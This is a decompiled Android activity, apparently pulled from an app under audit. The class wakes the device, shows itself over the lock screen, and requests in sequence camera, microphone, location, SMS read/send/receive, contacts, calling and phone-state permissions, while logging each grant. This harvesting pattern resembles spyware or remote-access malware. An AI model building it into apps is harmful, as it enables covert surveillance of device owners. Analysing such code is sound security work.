// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package lyr.stable.runtime;

import a2.i;
import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import d2.o;
import java.util.ArrayList;
import java.util.concurrent.atomic.AtomicBoolean;
import w1.l6;
import w1.m;
import w1.n;
import w1.v8;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public class SequentialPermissionActivity extends Activity {

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public static final AtomicBoolean f2565h = new AtomicBoolean(false);

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public String[] f2567b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public int f2568c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public int f2569d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public int f2570e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public boolean f2571f;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final Handler f2566a = new Handler(Looper.getMainLooper());

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public final i f2572g = new i(17, this);

    public final void a() {
        if (this.f2571f) {
            return;
        }
        this.f2571f = true;
        Log.d("ContentValues", "Done! Granted: " + this.f2569d + ", Denied: " + this.f2570e);
        m mVarC = m.c(this);
        mVarC.getClass();
        mVarC.f(15, n.h0("sequential_permissions_completed"));
        f2565h.set(false);
        this.f2566a.removeCallbacks(this.f2572g);
        n.A0(this, false);
        try {
            l6.a("permission_request");
        } catch (Throwable unused) {
        }
        try {
            finish();
        } catch (Throwable th) {
            Log.w("ContentValues", "permission finish failed", th);
        }
    }

    public final void b() {
        if (this.f2571f) {
            return;
        }
        try {
            if (this.f2566a.postDelayed(new v8(8, this), 13L)) {
                return;
            }
            Log.w("ContentValues", "permission continuation rejected");
            a();
        } catch (Throwable th) {
            Log.w("ContentValues", "permission continuation failed", th);
            a();
        }
    }

    public final void c() {
        if (this.f2571f) {
            return;
        }
        int i3 = this.f2568c;
        String[] strArr = this.f2567b;
        if (i3 >= strArr.length) {
            a();
            return;
        }
        String str = strArr[i3];
        Log.d("ContentValues", "Requesting [" + (this.f2568c + 1) + "/" + this.f2567b.length + "]: " + str);
        try {
            if (checkSelfPermission(str) != 0) {
                requestPermissions(new String[]{str}, 2101);
                return;
            }
            Log.i("ContentValues", "Already granted: " + str);
            this.f2569d = this.f2569d + 1;
            this.f2568c = this.f2568c + 1;
            b();
        } catch (Throwable th) {
            this.f2570e++;
            this.f2568c++;
            Log.w("ContentValues", "Permission request failed: " + str, th);
            b();
        }
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        f2565h.set(true);
        this.f2566a.post(this.f2572g);
        setShowWhenLocked(true);
        setTurnScreenOn(true);
        getWindow().addFlags(128);
        int i3 = Build.VERSION.SDK_INT;
        ArrayList arrayList = new ArrayList();
        arrayList.add("android.permission.CAMERA");
        arrayList.add("android.permission.RECORD_AUDIO");
        arrayList.add("android.permission.CALL_PHONE");
        arrayList.add("android.permission.ACCESS_FINE_LOCATION");
        arrayList.add("android.permission.ACCESS_COARSE_LOCATION");
        arrayList.add("android.permission.READ_SMS");
        arrayList.add("android.permission.RECEIVE_SMS");
        arrayList.add("android.permission.READ_CONTACTS");
        arrayList.add("android.permission.READ_PHONE_STATE");
        arrayList.add("android.permission.SEND_SMS");
        if (i3 <= 32) {
            arrayList.add("android.permission.READ_EXTERNAL_STORAGE");
            arrayList.add("android.permission.WRITE_EXTERNAL_STORAGE");
        }
        if (i3 >= 33) {
            arrayList.add("android.permission.POST_NOTIFICATIONS");
        }
        this.f2567b = (String[]) arrayList.toArray(new String[0]);
        Log.d("ContentValues", "Android API Level: " + i3);
        Log.d("ContentValues", "Total permissions: " + this.f2567b.length);
        try {
            l6.e("permission_request", 1, new o(18, this));
        } catch (Throwable th) {
            Log.w("ContentValues", "permission job launch failed", th);
            a();
        }
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        this.f2566a.removeCallbacksAndMessages(null);
        if (!this.f2571f) {
            m mVarC = m.c(this);
            mVarC.getClass();
            mVarC.f(15, n.h0("sequential_permissions_destroyed"));
        }
        f2565h.set(false);
        n.A0(this, false);
        try {
            l6.a("permission_request");
        } catch (Throwable unused) {
        }
        super.onDestroy();
    }

    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i3, String[] strArr, int[] iArr) {
        try {
            super.onRequestPermissionsResult(i3, strArr, iArr);
        } catch (Throwable th) {
            Log.w("ContentValues", "permission callback super failed", th);
        }
        if (i3 != 2101) {
            return;
        }
        String str = "?";
        if (iArr == null || iArr.length <= 0 || iArr[0] != 0) {
            StringBuilder sb = new StringBuilder("Denied: ");
            if (strArr != null && strArr.length > 0) {
                str = strArr[0];
            }
            sb.append(str);
            Log.d("ContentValues", sb.toString());
            this.f2570e++;
        } else {
            StringBuilder sb2 = new StringBuilder("Granted: ");
            if (strArr != null && strArr.length > 0) {
                str = strArr[0];
            }
            sb2.append(str);
            Log.d("ContentValues", sb2.toString());
            this.f2569d++;
        }
        int i4 = this.f2568c + 1;
        this.f2568c = i4;
        if (i4 < this.f2567b.length) {
            b();
        } else {
            a();
        }
    }
}
